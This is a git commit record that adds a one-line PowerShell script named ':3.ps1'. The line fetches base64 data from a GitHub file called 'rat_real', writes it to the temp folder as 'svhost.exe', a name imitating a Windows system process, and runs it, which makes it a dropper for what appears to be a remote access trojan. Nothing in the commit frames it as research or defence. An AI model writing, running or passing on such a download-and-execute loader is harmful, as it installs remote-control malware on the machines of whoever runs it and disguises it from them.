aa9ec1193c013785a70d6bd5b891a99be8b097e4
leetcodeuser123 <kingzers9851@gmail.com>
2024-07-15 09:37:17 -0700

    Create :3.ps1

---
+++ :3.ps1
@@ -0,0 +1,1 @@
+$exePath = "$env:TEMP\svhost.exe"; [System.IO.File]::WriteAllBytes($exePath, [System.Convert]::FromBase64String((irm "https://github.com/leetcodeuser123/temp/raw/main/rat_real"))); & $exePath
